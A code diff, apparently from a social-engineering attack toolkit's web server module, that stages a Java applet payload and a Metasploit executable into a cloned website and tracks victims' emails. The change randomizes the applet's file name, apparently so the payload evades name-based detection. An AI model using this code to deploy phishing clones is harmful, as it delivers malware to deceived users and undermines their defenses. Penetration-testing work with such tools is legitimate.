@@ -16,6 +16,13 @@ import datetime
 # see if we are tracking emails
 track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 
+# grab the randomized applet name
+applet_name = check_options("APPLET_NAME=")
+if applet_name == "":
+	applet_name = generate_random_string(6, 15) + ".jar"
+	update_options("APPLET_NAME=" + applet_name)
+
+
 # set current path
 definepath=os.getcwd()
 
@@ -157,9 +164,9 @@ def web_server_start():
             counter=0
             for line in fileopen:
                 counter=0
-                match=re.search("Signed_Update.jar", line)
+                match=re.search(applet_name, line)
                 if match:
-                    line=line.replace("Signed_Update.jar", "invalid.jar")
+                    line=line.replace(applet_name, "invalid.jar")
                     filewrite.write(line)
                     counter=1
                 match2=re.search("<head>", line)
@@ -182,9 +189,9 @@ def web_server_start():
             if attack_vector != 'hijacking':
                 print bcolors.YELLOW + "[*] Moving payload into cloned website." + bcolors.ENDC
                 # copy all the files needed
-                if not os.path.isfile(setdir + "/Signed_Update.jar"):
-                    shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/Signed_Update.jar" % (setdir))
-                shutil.copyfile(setdir + "/Signed_Update.jar", "%s/web_clone/Signed_Update.jar" % (setdir))
+                if not os.path.isfile(setdir + "/" + applet_name):
+                    shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/%s" % (setdir,applet_name))
+                shutil.copyfile(setdir + "/%s" % (applet_name), "%s/web_clone/%s" % (setdir,applet_name))
                 if os.path.isfile("%s/src/html/nix.bin" % (definepath)):
                     nix = check_options("NIX.BIN=")
                     shutil.copyfile("%s/src/html/nix.bin" % (definepath), "%s/web_clone/%s" % (setdir, nix))
@@ -287,7 +294,7 @@ def web_server_start():
                             break
 
     if apache == 1:
-        subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/Signed* %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,setdir,apache_path,setdir,apache_path,setdir,apache_path), shell=True).wait()
+        subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/*.jar %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,setdir,apache_path,setdir,apache_path,setdir,apache_path), shell=True).wait()
         # if we are tracking users
         if track_email == "on":
             now=datetime.datetime.today()
